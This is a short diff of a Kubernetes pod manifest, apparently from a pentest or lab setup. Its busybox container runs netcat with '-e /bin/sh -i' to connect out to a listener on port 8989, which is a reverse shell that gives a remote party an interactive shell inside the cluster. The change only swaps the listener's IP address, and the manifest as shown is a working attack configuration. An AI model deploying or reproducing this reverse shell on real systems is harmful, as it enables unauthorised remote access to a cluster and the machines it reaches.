@@ -9,7 +9,7 @@ spec:
   - name: busybox
     image: busybox
     command: ["/bin/nc"]
-    args: ["10.100.102.5", "8989", "-e", "/bin/sh", "-i"]
+    args: ["192.168.62.98", "8989", "-e", "/bin/sh", "-i"]
     stdin: true
     tty: true
     securityContext:
